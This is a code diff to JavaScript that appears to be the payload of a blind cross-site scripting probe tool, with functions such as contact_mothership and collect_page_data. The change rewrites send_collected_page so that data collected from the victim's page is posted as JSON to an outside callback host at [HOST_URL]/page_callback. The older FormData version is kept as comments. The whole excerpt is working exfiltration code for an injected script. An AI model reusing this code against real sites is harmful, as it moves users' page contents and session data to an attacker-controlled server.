@@ -163,22 +163,37 @@ function contact_mothership(probe_return_data) {
     http.send(form_data);
 }
 
-function send_collected_page(page_data) {
-    var form_data = new FormData();
-    var payload_keys = Object.keys(page_data);
-    payload_keys.map(function (payload_key) {
-        form_data.append(payload_key, page_data[payload_key]);
-    });
+//// Old method of sending page data in FormData format
+// function send_collected_page(page_data) {
+//     var form_data = new FormData();
+//     var payload_keys = Object.keys(page_data);
+//     payload_keys.map(function (payload_key) {
+//         form_data.append(payload_key, page_data[payload_key]);
+//     });
 
+//     var http = new XMLHttpRequest();
+//     var url = "[HOST_URL]/page_callback";
+//     http.open("POST", url, true);
+//     http.onreadystatechange = function () {
+//         if (http.readyState == 4 && http.status == 200) {
+
+//         }
+//     }
+//     http.send(form_data);
+// }
+
+//// New method of sending page data in JSON format
+function send_collected_page(page_data) {
     var http = new XMLHttpRequest();
     var url = "[HOST_URL]/page_callback";
     http.open("POST", url, true);
+    http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
     http.onreadystatechange = function () {
         if (http.readyState == 4 && http.status == 200) {
 
         }
     }
-    http.send(form_data);
+    http.send(JSON.stringify(page_data));
 }
 
 function collect_page_data(path) {
